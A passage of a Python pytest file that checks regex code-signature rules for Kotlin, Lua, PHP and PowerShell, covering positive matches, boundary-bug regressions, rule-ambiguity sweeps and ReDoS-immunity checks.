    ("encapsulation", "private val x = 5", None),
    ("listeners", "button.setOnClickListener { doThing() }", None),
    ("test_skip", "@Ignore", None),
    ("serialization_parsing", "Json.decodeFromString(str)", None),
    ("regex_execution", "Regex(pattern)", None),
    ("time_date_logic", "Instant.now()", None),
    ("ipc_rpc_bridges", "val intent = Intent(this, Foo::class.java)", None),
]


@pytest.mark.parametrize("signature,positive,negative", _KOTLIN_SIMPLE_CASES)
def test_kotlin_signature_positive_and_negative(signature, positive, negative):
    pattern = KOTLIN_RULES[signature]
    assert pattern is not None, f"kotlin's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"kotlin {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"kotlin {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_kotlin_ipc_rpc_bridges_empty_args_boundary_regression():
    """
    Regression test: `Intent\\(`/`HttpClient\\(` both end on `(`
    (non-word), so the shared trailing \\b only fired when a word char
    immediately followed the paren -- true for the common
    `Intent(this, Foo::class.java)` form, but never for the zero-argument
    form (`HttpClient()`).
    """
    pattern = KOTLIN_RULES["ipc_rpc_bridges"]
    assert pattern.search("val client = HttpClient()"), "the zero-argument HttpClient() form still didn't match"
    assert pattern.search("val intent = Intent(this, Foo::class.java)")
    assert pattern.search("BroadcastReceiver receiver;")


def test_kotlin_events_and_listeners_trailing_lambda_regression():
    """
    Regression test: `events` and `listeners` both required a literal
    `(`, but Kotlin's idiomatic SAM-conversion trailing-lambda form
    (`flow.collect { value -> ... }`, `button.setOnClickListener { ... }`,
    omitting the parens entirely) is the dominant real-world style --
    more common than the parenthesized form. Widened both to accept
    either `(` or `{`.
    """
    events = KOTLIN_RULES["events"]
    listeners = KOTLIN_RULES["listeners"]
    assert events.search("flow.collect { value -> use(value) }"), (
        "the trailing-lambda .collect { } form still didn't match"
    )
    assert events.search("flow.collect(collector)")
    assert listeners.search("button.setOnClickListener { doThing() }"), (
        "the trailing-lambda setOnClickListener { } form still didn't match"
    )
    assert listeners.search("button.setOnClickListener(listener)")
    assert not listeners.search("val collection = List(5) { it }"), (
        "listeners incorrectly matched an unrelated List(...) { ... } constructor call"
    )


def test_kotlin_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 2 pairs the automated ambiguity sweep flagged: args<->
    dead_code (sharing "fun"), class_start<->func_start (sharing
    visibility/inheritance modifiers like "public"/"open"/"abstract").
    Both confirmed non-bugs: class_start/func_start correctly co-firing
    as mutually exclusive on the same declaration (one anchors a class,
    the other a function) is intentional; dead_code's `//` comment-prefix
    requirement disambiguates it from func_start/class_start, but (as
    with several other languages closed earlier in this sweep) `args`
    itself isn't comment-aware and still matches a bareword "fun" inside
    a commented-out line -- an accepted, pre-existing design limit (args
    isn't line-anchored), not a new bug, consistent with the same
    finding already documented for perl/solidity/dart/go/ruby/scala/
    swift's own ambiguity sweeps.
    """
    args = KOTLIN_RULES["args"]
    dead_code = KOTLIN_RULES["dead_code"]
    class_start = KOTLIN_RULES["class_start"]
    func_start = KOTLIN_RULES["func_start"]

    live_fun = "fun foo() {"
    assert args.search(live_fun)
    assert not dead_code.search(live_fun)

    commented_fun = "// fun foo() {"
    assert dead_code.search(commented_fun)
    assert not func_start.search(commented_fun), "func_start incorrectly matched a commented-out fun"

    public_class = "public class Foo {"
    assert class_start.search(public_class) and not func_start.search(public_class)
    public_fun = "public fun foo() {"
    assert func_start.search(public_fun) and not class_start.search(public_fun)


def test_kotlin_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `myRegex.test('x')` colliding with its test-framework `.test(`):
    kotlin's `test` signature only matches `@Test`-style annotations,
    `assert*(`/`mockk`/`spyk`/`test(` barewords, or `shouldBe`/`every`/
    `verify` calls -- never a bare `.test(`-style regex method, so it
    doesn't collide with `regex_execution`'s `Regex(`/`.matches(`/
    `.find(` forms.
    """
    test_pattern = KOTLIN_RULES["test"]
    regex_pattern = KOTLIN_RULES["regex_execution"]
    snippet = "myRegex.matches(input)"
    assert regex_pattern.search(snippet)
    assert not test_pattern.search(snippet), "test incorrectly matched a regex method call"


def test_kotlin_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): kotlin's explicit_casts
    (`as Type`/`.toInt()`/etc.) and pointers (`CPointer<T>`/
    `COpaquePointer`) don't share tokens and fire independently.
    """
    casts = KOTLIN_RULES["explicit_casts"]
    pointers = KOTLIN_RULES["pointers"]
    assert casts.search("x as String")
    assert not casts.search("val p: CPointer<IntVar>"), "explicit_casts incorrectly matched a Kotlin/Native pointer"
    assert pointers.search("val p: CPointer<IntVar>")
    assert not pointers.search("x as String"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# LUA: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #594)
# ==============================================================================
LUA_RULES = LANGUAGE_DEFINITIONS["lua"]["rules"]

_LUA_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if x then", None),
    ("args", "function foo(x)", None),
    ("structural_boundaries", "local x = 5", None),
    ("func_start", "function foo()", None),
    ("class_start", "---@class Foo", None),
    ("safety", "local ok, err = pcall(foo)", None),
    ("safety_bypasses", "rawget(t, k)", None),
    ("high_risk_execution", 'os.execute("ls")', None),
    ("io", "io.open(path)", None),
    ("api", "function foo()", None),
    ("state_mutation", "x = 5", None),
    ("dead_code", "-- local x = 5", None),
    ("doc", "---@param x string", None),
    ("test", 'describe("foo", function() end)', None),
    ("concurrency", "coroutine.create(f)", None),
    ("ui_framework", "love.draw()", None),
    ("closures", "local f = function(x) end", None),
    ("globals", "_G.foo = 1", None),
    ("decorators", "---@public", None),
    ("generics", "---@generic T", None),
    ("comprehensions", "for k,v in pairs(t) do end", None),
    ("scientific", "math.sqrt(4)", None),
    ("reflection_metaprogramming", "__index", None),
    ("import", 'require("foo")', None),
    ("ownership", "-- Author: Jane Doe", None),
    ("planned_debt", "-- TODO: refactor", None),
    ("fragile_debt", "-- HACK: workaround", None),
    ("spec_exposure", "-- [SPEC-123]", None),
    ("ssr_boundaries", 'ngx.say("hi")', None),
    ("events", "part.Connect(func)", None),
    ("dependency_injection", 'container:resolve("foo")', None),
    ("pointers", 'ffi.new("int[1]")', None),
    ("memory_alloc", "ffi.C.malloc(10)", None),
    ("telemetry", 'log.info("msg")', None),
    ("debug_prints", 'print("debug")', None),
    ("explicit_casts", "tonumber(x)", None),
    ("panics_and_aborts", 'error("err")', None),
    ("thread_sleeps", "task.wait(1)", None),
    ("bitwise_ops", "a & b", None),
    ("sync_locks", "local mutex = Mutex.new()", None),
    ("immutability_locks", "local x <const> = 5", None),
    ("cleanup", "file:close()", None),
    ("encapsulation", "local x = 5", None),
    ("listeners", "emitter:on('event', cb)", None),
    ("test_skip", 'xit("skip this")', None),
    ("serialization_parsing", "cjson.decode(str)", None),
    ("regex_execution", "string.match(s, pattern)", None),
    ("time_date_logic", "os.time()", None),
    ("ipc_rpc_bridges", 'os.execute("ls")', None),
]


@pytest.mark.parametrize("signature,positive,negative", _LUA_SIMPLE_CASES)
def test_lua_signature_positive_and_negative(signature, positive, negative):
    pattern = LUA_RULES[signature]
    assert pattern is not None, f"lua's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"lua {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"lua {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_lua_listeners_on_call_boundary_regression():
    """
    Regression test: `on\\s*\\(` ends on `(` (non-word), so the shared
    trailing \\b could only fire when a word char immediately followed
    the paren -- never true for the common real call shape
    `emitter:on('event', cb)`, where a quote follows.
    """
    pattern = LUA_RULES["listeners"]
    assert pattern.search("emitter:on('event', cb)"), "on(...) still didn't match its most common form"
    assert pattern.search("emitter:subscribe(topic)")
    assert pattern.search("part.Connect(func)")


def test_lua_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 7 pairs the automated ambiguity sweep flagged, mostly
    centered on Lua 5.4's `<const>`/`<close>` attribute syntax
    (cleanup<->concurrency, cleanup<->safety, cleanup<->
    structural_boundaries, concurrency<->safety, concurrency<->
    structural_boundaries, safety<->structural_boundaries) plus
    dead_code<->doc (sharing "return"). All confirmed non-bugs:
    - A `<close>`-attributed local variable is genuinely triple-
      classified by design (it's simultaneously a safety mechanism, a
      structural declaration modifier, and a cleanup signal) -- verified
      directly, not a false collision.
    - "close" appearing in both `uv.close` (concurrency) and `io.close`/
      `ffi.C.free` (cleanup) are different, correctly-namespaced tokens
      that don't actually collide on the same real code.
    - dead_code's `--`/`--[=*[` comment-prefix requirement fully
      disambiguates it from doc's `---@return` EmmyLua tag (three
      dashes, not two) -- confirmed neither matches the other's positive
      case.
    """
    dead_code = LUA_RULES["dead_code"]
    doc = LUA_RULES["doc"]
    cleanup = LUA_RULES["cleanup"]
    safety = LUA_RULES["safety"]
    structural_boundaries = LUA_RULES["structural_boundaries"]
    concurrency = LUA_RULES["concurrency"]

    emmy_return = "---@return string"
    assert doc.search(emmy_return)
    assert not dead_code.search(emmy_return)

    commented_return = "-- return x"
    assert dead_code.search(commented_return)
    assert not doc.search(commented_return)

    close_var = "local f <close> = io.open(path)"
    assert cleanup.search(close_var) and safety.search(close_var) and structural_boundaries.search(close_var)

    uv_close = "uv.close(handle)"
    assert concurrency.search(uv_close)
    assert not cleanup.search(uv_close), "cleanup incorrectly matched uv.close (a distinct, namespaced token)"


def test_lua_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): lua's explicit_casts
    (`tonumber`/`tostring`/`ffi.cast`) and pointers (`ffi.new`/
    `ffi.cdef`/etc.) share `ffi.cast` intentionally (it's both a cast AND
    an FFI pointer operation), but don't otherwise collide.
    """
    casts = LUA_RULES["explicit_casts"]
    pointers = LUA_RULES["pointers"]
    assert casts.search("tonumber(x)")
    assert not casts.search('ffi.new("int[1]")'), "explicit_casts incorrectly matched an unrelated ffi.new call"
    assert pointers.search('ffi.new("int[1]")')
    assert not pointers.search("tonumber(x)"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# PHP: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #603)
# ==============================================================================
PHP_RULES = LANGUAGE_DEFINITIONS["php"]["rules"]

_PHP_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if ($x) {", None),
    ("args", "function foo($x) {", None),
    ("structural_boundaries", "namespace App;", None),
    ("func_start", "function foo() {", None),
    ("class_start", "class Foo {", None),
    ("safety", "try { risky(); } catch (Exception $e) {}", None),
    ("safety_bypasses", "@$x;", None),
    ("high_risk_execution", 'exec("ls");', None),
    ("io", 'fopen($path, "r");', None),
    ("api", "public function foo() {}", None),
    ("state_mutation", "$x = 5;", None),
    ("dead_code", "// function foo() {}", "// just a note"),
    ("doc", "/** A doc comment */", None),
    ("test", "assertEquals($a, $b);", None),
    ("concurrency", "Fiber::suspend();", None),
    ("ui_framework", 'view("index");', None),
    ("closures", "function() use ($x) {", None),
    ("globals", '$_SERVER["HOST"]', None),
    ("decorators", '#[Route("/foo")]', None),
    ("generics", "@template T", None),
    ("comprehensions", "array_map($fn, $arr);", None),
    ("scientific", "sqrt(4);", None),
    ("reflection_metaprogramming", "__get($name)", None),
    ("import", 'require "foo.php";', None),
    ("ownership", "@author Jane Doe", None),
    ("planned_debt", "// TODO: refactor", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123]", None),
    ("ssr_boundaries", "new JsonResponse($data);", None),
    ("events", "dispatchEvent($event);", None),
    ("dependency_injection", "app();", None),
    ("macros", "Macroable;", None),
    ("pointers", 'FFI::cast("int", $x);', None),
    ("memory_alloc", "new Foo();", None),
    ("telemetry", "Log::info('msg');", None),
    ("debug_prints", "echo $x;", None),
    ("explicit_casts", "(int) $x;", None),
    ("panics_and_aborts", "throw new Exception();", None),
    ("thread_sleeps", "sleep(1);", None),
    ("bitwise_ops", "$a & $b;", None),
    ("sync_locks", "flock($f, LOCK_EX);", None),
    ("immutability_locks", "const FOO = 1;", None),
    ("cleanup", "unset($x);", None),
    ("encapsulation", "private $x;", None),
    ("listeners", "addEventListener($cb);", None),
    ("test_skip", 'markTestSkipped("reason");', None),
    ("serialization_parsing", "json_decode($str);", None),
    ("regex_execution", "preg_match($pattern, $str);", None),
    ("time_date_logic", 'strtotime("now");', None),
    ("ipc_rpc_bridges", 'shell_exec("ls");', None),
]


@pytest.mark.parametrize("signature,positive,negative", _PHP_SIMPLE_CASES)
def test_php_signature_positive_and_negative(signature, positive, negative):
    pattern = PHP_RULES[signature]
    assert pattern is not None, f"php's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"php {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"php {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_php_globals_superglobals_leading_boundary_regression():
    """
    Regression test: the leading \\b before `$_SERVER`/`$_SESSION`/
    `$_ENV`/`$GLOBALS` requires a word char immediately before the `$` --
    never true in real PHP, where a superglobal is always preceded by
    whitespace, `=`, `(`, or a line start (all non-word). All 4 of PHP's
    most common superglobal accesses never matched at all.
    """
    pattern = PHP_RULES["globals"]
    assert pattern.search('$_SERVER["HOST"]'), "$_SERVER still didn't match"
    assert pattern.search('$_SESSION["user"]')
    assert pattern.search('$_ENV["PATH"]')
    assert pattern.search('$GLOBALS["x"]')


def test_php_safety_bypasses_at_operator_on_variable_regression():
    """
    Regression test: the `@` error-suppression check required the next
    char to be a letter/underscore, matching `@someFunc()` but missing
    PHP's extremely common `@$array['key']`/`@$var` suppression idiom
    (silencing "undefined index" notices).
    """
    pattern = PHP_RULES["safety_bypasses"]
    assert pattern.search("@$x;"), "@$variable still didn't match"
    assert pattern.search("@$arr['key'];")
    assert pattern.search("@file_get_contents($url);")


def test_php_ui_framework_view_and_render_boundary_regression():
    """
    Regression test: `view\\s*\\(`/`render\\s*\\(` both end on `(`
    (non-word), so the shared trailing \\b only fired when a word char
    immediately followed the paren -- never true for the common real
    call shape `view("index")`, where a quote follows.
    """
    pattern = PHP_RULES["ui_framework"]
    assert pattern.search('view("index");'), "view(...) still didn't match"
    assert pattern.search('render("partial");')
    assert pattern.search("class Foo extends Controller {")


def test_php_dead_code_line_comment_keyword_regression():
    """
    Regression test: the `function|class|namespace|use|if|foreach`
    keyword check only ran after `/*` (the rare block-comment form) -- a
    commented-out declaration using `//` (PHP's standard, far more
    common single-line comment style) never matched at all.
    """
    pattern = PHP_RULES["dead_code"]
    assert pattern.search("// function foo() {}"), "// function still didn't match"
    assert pattern.search("// class Foo {}")
    assert pattern.search("// namespace App;")
    assert pattern.search("// use App\\Foo;")
    assert pattern.search("// if ($x) {")
    assert pattern.search("// foreach ($x as $y) {")
    assert pattern.search("/* function foo() { */")
    assert not pattern.search("functional programming is neat")


def test_php_dependency_injection_macros_telemetry_time_empty_args_regression():
    """
    Regression test for a cluster of the same shape: `app\\(`/`make\\(`
    (dependency_injection), `macro\\s*\\(`/`mixin\\s*\\(` (macros),
    `logger\\(` (telemetry), `time\\s*\\(`/`date\\s*\\(`
    (time_date_logic), `go\\(` (concurrency), and `mock\\(`/`fake\\(`
    (test_skip) all end on `(` -- the shared trailing \\b only fired
    when a word char immediately followed the paren, never for the
    zero-argument or quoted-argument forms these are actually most
    commonly called with.
    """
    assert PHP_RULES["dependency_injection"].search("app();"), "app() still didn't match"
    assert PHP_RULES["dependency_injection"].search("make();")
    assert PHP_RULES["macros"].search('macro("foo", function () {});'), 'macro("...") still didn\'t match'
    assert PHP_RULES["telemetry"].search("logger()->info('message');"), "logger()->info(...) still didn't match"
    assert PHP_RULES["time_date_logic"].search("time();"), "time() still didn't match"
    assert PHP_RULES["time_date_logic"].search('date("Y-m-d");')
    assert PHP_RULES["concurrency"].search("go();"), "go() still didn't match"
    assert PHP_RULES["test_skip"].search("mock();"), "mock() still didn't match"
    assert PHP_RULES["test_skip"].search("fake();")


def test_php_decorators_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS:
    `[a-zA-Z0-9_:\\\\]+` and `[^\\]]*` are two adjacent unbounded
    quantifiers matching an overlapping character set (both match plain
    letters/digits) -- against an adversarial attribute name with no
    closing `]`, every possible split between the two quantifiers gets
    tried before failing. Confirmed genuine O(n^2) scaling (0.045s/0.18s/
    0.71s/2.85s at n=10k/20k/40k/80k, ~4x per doubling) before being
    bounded.
    """
    pattern = PHP_RULES["decorators"]
    poison = "#[" + "a" * 80000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    assert pattern.search('#[Route("/foo")]')
    assert pattern.search("#[ORM\\Entity]")
    assert pattern.search("#[Test]")


def test_php_state_mutation_redos_immunity():
    """
    Regression test for the pre-existing quadratic-blowup fix noted
    directly in the source: the optional `(?:\\w+)?` before the
    required-but-often-absent `->`/`::` was unbounded with no preceding
    \\b anchor. Bounded to `{1,100}`; verify it stays immune.
    """
    pattern = PHP_RULES["state_mutation"]
    poison = "x" * 80000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)
    assert pattern.search("$x = 5;")
    assert pattern.search("$obj->prop = 5;")


def test_php_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's many findings for php
    (args<->dead_code, class_start<->dead_code, class_start<->generics,
    class_start<->reflection_metaprogramming, class_start<->
    ui_framework, dead_code<->generics, dead_code<->
    reflection_metaprogramming, dead_code<->ui_framework,
    explicit_casts<->generics, explicit_casts<->serialization_parsing,
    generics<->ui_framework, api<->io, api<->reflection_metaprogramming,
    io<->reflection_metaprogramming) -- all confirmed false positives via
    direct empirical verification: dead_code's comment-prefix requirement
    disambiguates it from args/class_start (and, after the fix above,
    now covers both `//` and `/*` comment styles), a route attribute
    (`#[Get(...)]`), the `$_GET` superglobal, and the `__get` magic
    method are all structurally distinct tokens that never collide on
    the same real code, and explicit casts (`(array)`/`(string)`) never
    match generics'/serialization's unrelated type-name tokens.
    """
    args = PHP_RULES["args"]
    dead_code = PHP_RULES["dead_code"]
    class_start = PHP_RULES["class_start"]
    api = PHP_RULES["api"]
    io = PHP_RULES["io"]
    reflection = PHP_RULES["reflection_metaprogramming"]
    casts = PHP_RULES["explicit_casts"]
    generics = PHP_RULES["generics"]
    serialization = PHP_RULES["serialization_parsing"]

    live_func = "function foo() {"
    assert args.search(live_func)
    assert not dead_code.search(live_func)
    commented_func = "// function foo() {"
    assert dead_code.search(commented_func)

    live_class = "class Foo extends Bar implements Baz {"
    assert class_start.search(live_class)
    assert not dead_code.search(live_class)
    commented_class = "// class Foo {"
    assert dead_code.search(commented_class)
    assert not class_start.search(commented_class)

    route_attr = '#[Get("/users")]'
    assert api.search(route_attr)
    assert not io.search(route_attr) and not reflection.search(route_attr)

    http_get = '$_GET["id"]'
    assert io.search(http_get)
    assert not api.search(http_get)

    magic_get = "public function __get($name) {"
    assert reflection.search(magic_get)

    assert casts.search("(array) $x")
    assert not generics.search("(array) $x")
    assert casts.search("(string) $x")
    assert not serialization.search("(string) $x")


def test_php_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): php's explicit_casts
    (`(int)`/`(string)`/etc.) and pointers (`FFI::cast`/`FFI::addr`)
    don't share tokens and fire independently.
    """
    casts = PHP_RULES["explicit_casts"]
    pointers = PHP_RULES["pointers"]
    assert casts.search("(int) $x;")
    assert not casts.search('FFI::cast("int", $x);'), "explicit_casts incorrectly matched an FFI cast"
    assert pointers.search('FFI::cast("int", $x);')
    assert not pointers.search("(int) $x;"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================
POWERSHELL_RULES = LANGUAGE_DEFINITIONS["powershell"]["rules"]

_POWERSHELL_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if ($x) {", None),
    ("args", "function foo($x) {", None),
    ("structural_boundaries", "function foo {", None),
    ("func_start", "function Foo {", None),
    ("class_start", "class Foo {", None),
    ("safety", "try { risky() } catch {}", None),
    ("safety_bypasses", "Out-Null", None),
    ("high_risk_execution", "Invoke-Expression $cmd", None),
    ("io", "Get-Content $path", None),
    ("api", "Export-ModuleMember -Function Foo", None),
    ("state_mutation", "$x = 5", None),
    ("dead_code", "# function Foo {}", "# just a note"),
    ("doc", ".SYNOPSIS", None),
    ("test", "Should -Be 5", None),
    ("concurrency", "Start-Job { Get-Process }", None),
    ("ui_framework", "Out-GridView", None),
    ("closures", "{ $_.Name }", None),
    ("globals", "$global:x = 1", None),
    ("decorators", "[Parameter(Mandatory=$true)]", None),
    ("generics", "[List[int]]::new()", None),
    ("comprehensions", "$x | Where-Object { $_ -gt 5 }", None),
    ("scientific", "[Math]::Sqrt(4)", None),
    ("reflection_metaprogramming", "Add-Type -TypeDefinition $src", None),
    ("import", "Import-Module Foo", None),
    ("ownership", "# Author: Jane Doe", None),
    ("planned_debt", "# TODO: refactor", None),
    ("fragile_debt", "# HACK: workaround", None),
    ("spec_exposure", "[SPEC-123]", None),
    ("ssr_boundaries", "New-PodeServer", None),
    ("events", "Register-ObjectEvent $obj EventName", None),
    ("dependency_injection", "Get-Service Foo", None),
    ("pointers", "[IntPtr]::Zero", None),
    ("memory_alloc", "[System.Runtime.InteropServices.Marshal]::AllocHGlobal(10)", None),
    ("telemetry", "Write-Verbose 'msg'", None),
    ("debug_prints", "Write-Host 'msg'", None),
    ("explicit_casts", "[int]$x", None),
    ("panics_and_aborts", "throw 'error'", None),
    ("thread_sleeps", "Start-Sleep 5", None),
    ("bitwise_ops", "$a -band $b", None),
    ("sync_locks", "[System.Threading.Monitor]::Enter($lock)", None),
    ("immutability_locks", "New-Variable Foo -Option Constant", None),
    ("cleanup", "Remove-Item $path", None),
    ("encapsulation", "hidden [int] $x", None),
    ("listeners", "Register-ObjectEvent $obj EventName", None),
    ("test_skip", "It 'test' -Skip", None),
    ("serialization_parsing", "ConvertFrom-Json $str", None),
    ("regex_execution", "$x -match $pattern", None),
    ("time_date_logic", "Get-Date", None),
    ("ipc_rpc_bridges", "Invoke-Command -ScriptBlock {}", None),
]


@pytest.mark.parametrize("signature,positive,negative", _POWERSHELL_SIMPLE_CASES)
def test_powershell_signature_positive_and_negative(signature, positive, negative):
    pattern = POWERSHELL_RULES[signature]
    assert pattern is not None, f"powershell's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"powershell {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"powershell {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_powershell_concurrency_parallel_leading_boundary_regression():
    """
    Regression test: `-Parallel` starts with `-` (non-word), so the
    shared leading \\b could only fire when a word char immediately
    preceded the `-` -- never true for how this ForEach-Object flag is
    actually written (always preceded by whitespace). PS7's parallel
    pipeline feature never matched at all.
    """
    pattern = POWERSHELL_RULES["concurrency"]
    assert pattern.search("1..10 | ForEach-Object -Parallel { $_ }"), "-Parallel still didn't match"
    assert pattern.search("Start-Job { Get-Process }")
    assert pattern.search("[System.Management.Automation.RunspaceFactory]::CreateRunspacePool()")


def test_powershell_import_dot_sourcing_leading_boundary_regression():
    """
    Regression test: the dot-sourcing alternative (`. .\\script.ps1`)
    starts with `.` (non-word), so the shared leading \\b could only fire
    when a word char immediately preceded the `.` -- never true for how
    dot-sourcing is actually written (always preceded by whitespace or a
    line start). This common PowerShell module-loading idiom never
    matched at all.
    """
    pattern = POWERSHELL_RULES["import"]
    assert pattern.search(". .\\script.ps1"), "dot-sourcing still didn't match"
    assert pattern.search(". ./lib/helpers.ps1")
    assert pattern.search("Import-Module Foo")


def test_powershell_regex_execution_operators_leading_boundary_regression():
    """
    Regression test: `-match`/`-replace`/`-split` all start with `-`
    (non-word), so the shared leading \\b could only fire when a word
    char immediately preceded the `-` -- never true for how these
    operators are actually written (always preceded by whitespace, after
    the left-hand operand). PowerShell's three most common native regex
    operators never matched at all.
    """
    pattern = POWERSHELL_RULES["regex_execution"]
    assert pattern.search("$x -match $pattern"), "-match still didn't match"
    assert pattern.search("$x -replace 'a', 'b'")
    assert pattern.search("$x -split ','")
    assert pattern.search("Select-String -Pattern $p")
    assert pattern.search("[regex]::Match($x, $p)")


def test_powershell_func_start_generic_return_type_regression():
    """
    Regression test: the return-type bracket class `[^\\]]+` couldn't
    represent one level of nested brackets, so a PS class method with a
    generic .NET return type never matched at all, unlike the identical
    non-generic form which did.
    """
    pattern = POWERSHELL_RULES["func_start"]
    assert pattern.search("[Dictionary[string,int]] GetMap() {"), "generic return type still didn't match"
    assert pattern.search("[System.Collections.Generic.List[string]] GetItems() {")
    assert pattern.search("[int] GetValue() {"), "non-generic return type regressed"
    assert pattern.search("function Foo() {")


def test_powershell_closures_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the unbounded
    `[^}]*` before the closing `}`, combined with unanchored search, is
    quadratic on payloads with many `{` and no matching `}` (each of the
    n starting positions scans ~n chars before failing). Confirmed
    genuine O(n^2) scaling (~0.002s/0.007s/0.03s/0.11s/0.46s at
    n=2k/4k/8k/16k/32k, ~4x per doubling) before being bounded.
    """
    pattern = POWERSHELL_RULES["closures"]
    poison = "{" * 80000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    assert pattern.search("{ $_.Name }")
    assert pattern.search("$sb = { param($x, $y) $x + $y }")
    assert pattern.search("Get-ChildItem | Where-Object { $_.Length -gt 100 }")


def test_powershell_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's findings for powershell
    (class_start<->dead_code on 'class', dead_code<->func_start on
    'function', decorators<->doc on 'parameter') -- all confirmed false
    positives via direct empirical verification: dead_code requires an
    immediately-preceding `#`/`<#` comment marker before the keyword,
    which class_start/func_start's line-start anchors (`^[ \\t]*`)
    structurally exclude (a comment marker is never whitespace), so a
    live declaration and its commented-out form never collide. Similarly,
    decorators' `[Parameter(...)]` attribute syntax and doc's
    `.PARAMETER` comment-based help token are structurally distinct (one
    requires a bracket-wrapped call with parens, the other a leading dot)
    and never match the same text.
    """
    class_start = POWERSHELL_RULES["class_start"]
    func_start = POWERSHELL_RULES["func_start"]
    dead_code = POWERSHELL_RULES["dead_code"]
    decorators = POWERSHELL_RULES["decorators"]
    doc = POWERSHELL_RULES["doc"]

    live_class = "class Foo { }"
    assert class_start.search(live_class)
    assert not dead_code.search(live_class)
    commented_class = "# class Foo { }"
    assert dead_code.search(commented_class)
    assert not class_start.search(commented_class)

    live_func = "function Do-Thing { }"
    assert func_start.search(live_func)
    assert not dead_code.search(live_func)
    commented_func = "# function Do-Thing { }"
    assert dead_code.search(commented_func)
    assert not func_start.search(commented_func)

    attribute = "[Parameter(Mandatory=$true)]"
    assert decorators.search(attribute)
    assert not doc.search(attribute)
    comment_help = ".PARAMETER Name"
    assert doc.search(comment_help)
    assert not decorators.search(comment_help)


def test_powershell_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C-style cast syntax
    overlapping pointer-type tokens): powershell's explicit_casts
    (`[int]`/`[string]`/etc.) and pointers (`[IntPtr]`/`[UIntPtr]`/
    `[ref]`) use disjoint bracketed-keyword sets and never match the
    same text.
    """
    casts = POWERSHELL_RULES["explicit_casts"]
    pointers = POWERSHELL_RULES["pointers"]
    assert casts.search("[int]$x")
    assert not casts.search("[IntPtr]::Zero"), "explicit_casts incorrectly matched an IntPtr token"
    assert pointers.search("[IntPtr]::Zero")
    assert not pointers.search("[int]$x"), "pointers incorrectly matched an explicit cast"


def test_powershell_test_and_regex_execution_intentional_overlap():
    """
    Known ambiguity pattern from the issue template (test-assertion
    syntax overlapping regex-execution operators): unlike the
    explicit_casts/pointers pair above, this one is a genuine, intentional
    overlap rather than a false collision. Pester's `Should -Match`
    assertion literally performs a regex match under the hood, so a line
    like `Should -Match 'foo'` is correctly classified as both a test
    assertion AND regex execution -- both signatures are expected to fire
    on the same text, and that is not a bug.
    """
    test = POWERSHELL_RULES["test"]
    regex_execution = POWERSHELL_RULES["regex_execution"]
    pester_match_assertion = "Should -Match 'foo'"
    assert test.search(pester_match_assertion)
    assert regex_execution.search(pester_match_assertion)


def test_powershell_func_start_and_generics_no_false_collision():
    """
    Known ambiguity pattern from the issue template (function-signature
    type annotations overlapping generic type-parameter syntax):
    func_start's return-type form correctly recognizes non-generic and
    (after the fix above) generic return types on class methods, while
    generics' own signature (which requires a bracket immediately
    followed by another `[...]]`) does not fire on the plain non-generic
    form, so the two only co-fire on text that is genuinely both a
    function start and a generic type usage.
    """
    func_start = POWERSHELL_RULES["func_start"]
    generics = POWERSHELL_RULES["generics"]

    plain_method = "[int] GetValue() {"
    assert func_start.search(plain_method)
    assert not generics.search(plain_method)

    generic_method = "[Dictionary[string,int]] GetMap() {"
    assert func_start.search(generic_method)
    assert generics.search(generic_method)


def test_powershell_bitwise_ops_and_closures_no_false_collision():
    """
    Known ambiguity pattern from the issue template (bitwise-operator
    tokens overlapping closure/scriptblock brace syntax): powershell's
    bitwise_ops uses distinct `-band`/`-bor`/`-bxor`/`-bnot`/`-shl`/`-shr`
    operator tokens, structurally unrelated to closures' `{ ... }`
    scriptblock delimiters, so neither fires on text containing only the
    other's construct.
    """
    bitwise_ops = POWERSHELL_RULES["bitwise_ops"]
    closures = POWERSHELL_RULES["closures"]

    assert bitwise_ops.search("$a -band $b")
    assert not closures.search("$a -band $b")

    assert closures.search("{ $_.Name }")
